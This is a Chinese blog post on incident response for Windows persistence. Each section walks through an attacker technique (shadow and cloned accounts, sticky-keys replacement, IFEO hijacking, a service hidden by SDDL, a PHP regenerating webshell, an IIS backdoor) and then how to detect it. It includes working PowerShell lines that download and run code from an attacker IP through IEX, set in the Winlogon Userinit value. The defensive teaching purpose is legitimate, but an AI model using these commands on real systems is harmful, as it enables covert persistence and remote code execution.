## 一、基本介绍

红队攻击者在对目标进行渗透利用后通常都会进行权限维持，以达到持续利用的目的。而作为防守方进行应急响应时，应该如何与技术高超（jiaohuajianzha）的攻击者斗智斗勇呢？或许可以通过本文可以找到答案。以下内容不仅可以助力你拿捏应急响应，也能够让你在红蓝对抗中更胜一筹。篇幅有限只能先写一下Windows系统的应急响应。

## 二、维持应急

### （一）Windows隐藏维持

1.维持方法：通过输入以下命令进行隐藏后门木马文件

> Attrib +s +a +h +r 【文件名】

![1651740616_62738fc875f68e2d132a8.png!small?1651740616675](https://image.3001.net/images/20220505/1651740616_62738fc875f68e2d132a8.png!small?1651740616675)

2.隐藏效果：
此时即使打开了显示隐藏文件都看不见该文件![1651740598_62738fb689e83e105daff.png!small?1651740598891](https://image.3001.net/images/20220505/1651740598_62738fb689e83e105daff.png!small?1651740598891)

3.应急查找：通过输入以下命令来见招拆招查找隐藏后门

Attrib -s -a -h -r *.exe*

### （二）影子账号维持

1.维持方法：在创建的账号后面添加一个`$`符号就会使其隐藏的特性来达到隐藏账号的目的，比如创建一个binbin$的账号![1651740688_627390109811a7d8e3574.png!small?1651740688755](https://image.3001.net/images/20220505/1651740688_627390109811a7d8e3574.png!small?1651740688755)

2.隐藏效果：此时无法通过输入net
user查找到该新建用户![1651740707_62739023ef3498735c723.png!small?1651740708115](https://image.3001.net/images/20220505/1651740707_62739023ef3498735c723.png!small?1651740708115)

3.应急查找：可以通过输入win+R，然后输入lusrmgr.msc。在本地用户和组中可以查看到该隐藏账号![1651740728_62739038abf452d12baa3.png!small?1651740728944](https://image.3001.net/images/20220505/1651740728_62739038abf452d12baa3.png!small?1651740728944)

### （三）克隆账号维持

1.维持方法：

a.使用第二条中的创建影子的方式创建一个影子账号，然后再Win+R→regedit进入注册表。![1651740764_6273905c1a22ff67cd78d.png!small?1651740764431](https://image.3001.net/images/20220505/1651740764_6273905c1a22ff67cd78d.png!small?1651740764431)

b.找到HEKY_LOCAL_MACHINE\SAM\SAM，首次进入需要右键修改一下其权限为完全控制。按F5进行刷新进入到该文件夹![1651740797_6273907db6df9b2d5be5e.png!small?1651740798040](https://image.3001.net/images/20220505/1651740797_6273907db6df9b2d5be5e.png!small?1651740798040)

c.将000001F4（超级管理员账号）的F项目的值全部复制![1651740819_62739093323401acf523a.png!small?1651740819610](https://image.3001.net/images/20220505/1651740819_62739093323401acf523a.png!small?1651740819610)

d.查看刚新建账号的对应的文件，可以看到该类型为0x3ea，所以新建账号binbin对应的文件夹为000003EA

![1651740844_627390ac6439fced6395b.png!small?1651740844764](https://image.3001.net/images/20220505/1651740844_627390ac6439fced6395b.png!small?1651740844764)

e.将刚才复制到管理的F值粘贴到刚建立的账号000003EA中的F项

![1651740862_627390be4dd121e91f166.png!small?1651740862646](https://image.3001.net/images/20220505/1651740862_627390be4dd121e91f166.png!small?1651740862646)

f.导出binbin$和3EB

![1651740878_627390ce9aaac80b47c9c.png!small?1651740879016](https://image.3001.net/images/20220505/1651740878_627390ce9aaac80b47c9c.png!small?1651740879016)

g. 删除掉刚建立的影子账号，然后双击导入刚导出的注册表

![1651740894_627390de6a76c69434ddf.png!small?1651740894614](https://image.3001.net/images/20220505/1651740894_627390de6a76c69434ddf.png!small?1651740894614)

2.隐藏效果：此时无论net
user还是lusrmgr.msc查询都查看不到该克隆账号。但是能够使用该账号进行远程登录![1651740925_627390fdaa681f9619fbf.png!small?1651740925806](https://image.3001.net/images/20220505/1651740925_627390fdaa681f9619fbf.png!small?1651740925806)

![1651740946_6273911253fa8d4b94123.png!small?1651740946521](https://image.3001.net/images/20220505/1651740946_6273911253fa8d4b94123.png!small?1651740946521)

3.应急查找：为什么刚才要将创建过程写这么详细，就是为了我们去寻找。我们可以同样来到注册表HEKY_LOCAL_MACHINE\SAM\SAM中，然后查找有没有跟000001F4（超级管理员账号）的F值一样的账号即是克隆账号

### （四）组策略脚本维持

1.维持方法：win+R→gpedit.msc进入到组策略中，找到Windows设置→脚本→启动。然后添加后门的路径即可![1651741054_6273917e623fa6a44eba3.png!small?1651741055159](https://image.3001.net/images/20220505/1651741054_6273917e623fa6a44eba3.png!small?1651741055159)

2.维持效果：只要该主机进行启动，都会顺带启动该后门文件

3.应急查找：在应急响应的时候，为什么总有木马能够悄悄启动运行，可能就是因为这个组策略中设置了启动后门脚本。可以使用win+R→gpedit.msc进行查找，或win+R→msconfig查看启动项

![1651741094_627391a61acc41ab36cf4.png!small?1651741097676](https://image.3001.net/images/20220505/1651741094_627391a61acc41ab36cf4.png!small?1651741097676)

### （五）粘滞键后门维持

1.维持方法：

a.进入到`C:\Windows\System32`找到**sethc.exe**文件

![1651741132_627391cc35af4bbb65166.png!small?1651741132741](https://image.3001.net/images/20220505/1651741132_627391cc35af4bbb65166.png!small?1651741132741)

b.修改其权限为当前权限可以进行完全控制并且所有者为当前用户![1651741159_627391e7b822b0f2966d9.png!small?1651741160190](https://image.3001.net/images/20220505/1651741159_627391e7b822b0f2966d9.png!small?1651741160190)

![1651741180_627391fcb377b033f47b5.png!small?1651741181061](https://image.3001.net/images/20220505/1651741180_627391fcb377b033f47b5.png!small?1651741181061)

c.将其移动到其他位置，并用木马文件替换原本该**sethc.exe**文件

![1651741223_62739227b767c7401e04a.png!small?1651741223870](https://image.3001.net/images/20220505/1651741223_62739227b767c7401e04a.png!small?1651741223870)

d.使用放大镜（Magnify.exe）、设置中心（utilman.exe）、屏幕放大中心（osk.exe）也能够实现此种维持效果![1651741239_62739237c709e9a1e4d2b.png!small?1651741240258](https://image.3001.net/images/20220505/1651741239_62739237c709e9a1e4d2b.png!small?1651741240258)

2.维持效果：此时不用输入任何密码，只要按粘滞键5次就会启动后门程序运行

![1651741253_627392450d9ea3078c9bd.png!small?1651741253387](https://image.3001.net/images/20220505/1651741253_627392450d9ea3078c9bd.png!small?1651741253387)

3.应急查找：使用win+R→cmd进入到DOS界面后输入以下命令查找，如果有则表示该启动着并且可能已经被替换，可以通过右键查看其属性来查看其具体情况判断

> tasklist | findstr "setch.exe"
>
> tasklist | findstr "Magnify.exe"

### （六）Winlogon无落地文件维持

1.维持方法：

a.在Powershell中输入以下命令进行修改Winlogon的Userinit字段的键值

    
    
    Set-ItemProperty   "HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon" -name   Userinit -value "C:\Windows\system32\userinit.exe,***************"

b.然后继续在Powershell中输入以下命令来达到无文件落地就能执行后门效果，192.168.1.131为攻击机IP

    
    
    Set-ItemProperty   "HKLM:\SOFTWARE\Microsoft\WINDOWS NT\CurrentVersion\Winlogon" -name   Userinit -value "C:\Windows\system32\userinit.exe, powershell.exe -nop   -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.1.131/a'))\""

2.维持效果：因为Winlogon.exe 进程是Windows自带的系统进程，所以很难发现

3.应急查找：仔细检查以下的注册表中的键值是否存在可以的程序

> HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\

### （七）映像劫持维持

1.维持方法：

a.Win+R→regedit进入注册表，找到以下目录下

> HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File
> Execution Options

![1651741315_62739283446cf0e88c9bd.png!small?1651741315817](https://image.3001.net/images/20220505/1651741315_62739283446cf0e88c9bd.png!small?1651741315817)

b.在该文件下新建一个比较有迷惑性的项（如原本就已经安装的常用软件）

![1651741349_627392a5e7e2eacdffad1.png!small?1651741350409](https://image.3001.net/images/20220505/1651741349_627392a5e7e2eacdffad1.png!small?1651741350409)

c.然后在新建的项里面添加一个Debugger，并将其值修改为后门木马的绝对路径

![1651741369_627392b9affb213987eeb.png!small?1651741370083](https://image.3001.net/images/20220505/1651741369_627392b9affb213987eeb.png!small?1651741370083)

d.将原本存在可执行文件包生成一个快捷文件，等待受害者点击即可

  

2.维持效果：此时只要受害者点击该快捷启动文件就会被劫持到启动后门文件

3.应急查找：

a.仔细检查注册表中以下路径中的程序名称及键值，查看其键值是否指向其对应名称的文件。

> HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
> Execution Option

![1651741419_627392eb74c96e7ecc3c1.png!small?1651741419900](https://image.3001.net/images/20220505/1651741419_627392eb74c96e7ecc3c1.png!small?1651741419900)

b.加固时可以将注册表审计打开，进入到softwar项并修改。同时禁止对注册表的远程访问，可关闭Remote
Registry服务![1651741655_627393d70751e651e9d53.png!small?1651741655298](https://image.3001.net/images/20220505/1651741655_627393d70751e651e9d53.png!small?1651741655298)

![1651741752_62739438bdc16fced4751.png!small?1651741753167](https://image.3001.net/images/20220505/1651741752_62739438bdc16fced4751.png!small?1651741753167)

### （八）SDDL隐藏维持

1.维持方法：

a.输入win+R→cmd进入DOS界面后输入以下命令进行创建自启动服务，并启动该服务

sc create ".NET CLR Networking 3.5.0.0" binpath= "cmd.exe /k
C:\Users\administrator\beacon.exe" depend= Tcpip obj= Localsystem start= auto

![1651741805_6273946d72603ec5c040c.png!small?1651741805596](https://image.3001.net/images/20220505/1651741805_6273946d72603ec5c040c.png!small?1651741805596)

b.此时可以通过sc query、Get-Service、services.msc方式进行查看到该服务器

![1651741829_6273948560b5cb6990de2.png!small?1651741829632](https://image.3001.net/images/20220505/1651741829_6273948560b5cb6990de2.png!small?1651741829632)

c.所以可通过修改SDDL来隐藏服务

sc sdset ".NET CLR Networking 3.5.0.0" "D:(D;;DCLCWPDTSD;;;IU)
(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)
(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)
(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"

![1651741846_6273949652808dfdc2855.png!small?1651741846523](https://image.3001.net/images/20220505/1651741846_6273949652808dfdc2855.png!small?1651741846523)

d.此时再使用sc query
已经查看不了该服务。同时在服务中也查看不了，但是可以在注册表中查看到该服务，并且能够看到该服务的地址指向写的后门文件![1651741862_627394a64946c242fcca0.png!small?1651741862808](https://image.3001.net/images/20220505/1651741862_627394a64946c242fcca0.png!small?1651741862808)

![1651741893_627394c5ea600a449752f.png!small?1651741894307](https://image.3001.net/images/20220505/1651741893_627394c5ea600a449752f.png!small?1651741894307)

e.在kali中新建一个1.ps1，里面写入内容如下来隐藏注册表信息![1651741914_627394da039ae43fc2b29.png!small?1651741915079](https://image.3001.net/images/20220505/1651741914_627394da039ae43fc2b29.png!small?1651741915079)

f.然后开启临时http服务![1651741924_627394e414474d3132fce.png!small?1651741924329](https://image.3001.net/images/20220505/1651741924_627394e414474d3132fce.png!small?1651741924329)

g.在被攻击主机中输入如下命令来执行刚才生成的1.ps1文件。192.168.1.138为kali的IP

> powershell.exe -exec bypass -nop -w hidden -c "IEX((new-object
> net.webclient).downloadstring('http://192.168.1.138/1.ps1'));Server-Sddl-> Change -Name '.NET CLR Networking 3.5.0.0'"

  

2.维持效果：重启启动靶机后可以看到已经在注册表中完全隐藏了该项服务

![1651741959_627395076879cd5bc74db.png!small?1651741959761](https://image.3001.net/images/20220505/1651741959_627395076879cd5bc74db.png!small?1651741959761)

3.应急查找：

a.可以使用Wireshark进行流量抓包，通过查看进出流量判断恶意连接软件的存在  
b. 如果对方使用了以下的拒绝语句来隐藏，则可以使用以下语句来删除拒绝相关的SDDL语句，从而能够正常查询该后门

> & $env:SystemRoot\System32\sc.exe sdset ".NET CLR Networking 3.5.0.0"
> "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"

### （九）PHP不死马后门维持

1.维持方法：使用如下不死马php持续不断生成木马文件

> <?php  
> ignore_user_abort(); //关掉浏览器，PHP脚本也可以继续执行.  
> set_time_limit(0); //通过set_time_limit(0)可以让程序无限制的执行下去  
> $interval = 5; // 每隔*秒运行  
> do {  
> $filename = 'test.php';  
> if(file_exists($filename)) {  
> echo "xxx";  
> }  
> else {  
> $file = fopen("test.php", "w"); //修改此行可以改变生成的木马文件名  
> $txt = "<?php phpinfo();?>\n"; //此行为写入的木马文件内容，可根据需要进行修改  
> fwrite($file, $txt);  
> fclose($file);  
> }  
> sleep($interval);  
> } while (true);  
> ?>

2.维持效果：即使将该木马文件删除后也会不断产生，从而达到shell维持的效果

3.应急查找：

a.此时应该先关闭Web服务程序，如Apache或IIS等，然后查找web服务目录下是否存在可疑文件。

b.找到该不死马之后和生成的木马文件都删除干净后才重启Web服务程序。

c.可以使用everything中的dm语法，根据文件生成时间来查找该不死马和生成的木马文件

![1651739905_62738d0152a796ed2dfa2.png!small?1651739905496](https://image.3001.net/images/20220505/1651739905_62738d0152a796ed2dfa2.png!small?1651739905496)

### （十）IIS后门权限维持

1.维持方法：使用IIS_backdoor文件，在网站目录下新建一个/bin文件夹。并把IIS_backdoor_dll.dll存放在这里面。将IIS的自带文件（比如iis-85图片）作为启动路径![1651740126_62738dde36054b7f5d888.png!small?1651740126737](https://image.3001.net/images/20220505/1651740126_62738dde36054b7f5d888.png!small?1651740126737)

2.维持效果：如果将IIS_backdoor文件设置为隐藏就可以比较难于发现了，可以通过IIS_backdoor中的软件进行shell连接，执行任意命令![1651740051_62738d936bb8c8038b587.png!small?1651740051876](https://image.3001.net/images/20220505/1651740051_62738d936bb8c8038b587.png!small?1651740051876)

3.应急查找：

a.关闭Web服务程序，然后对Web目录进行查找

b.同样可以使用everything进行查找，查找语法为以下

> dm:【时间】.dll

## 三、推荐工具

1.Everything：文件查找，可以按照建立时间全盘快速寻找到文件从而方便查找到隐藏的木马文件

2.Wireshark：流量分析，根据进出连接的流量进行分析，从而锁定攻击者IP

3.火绒剑：进程分析，可以直接分析运行进程和子进程，以及其对应的启动文件

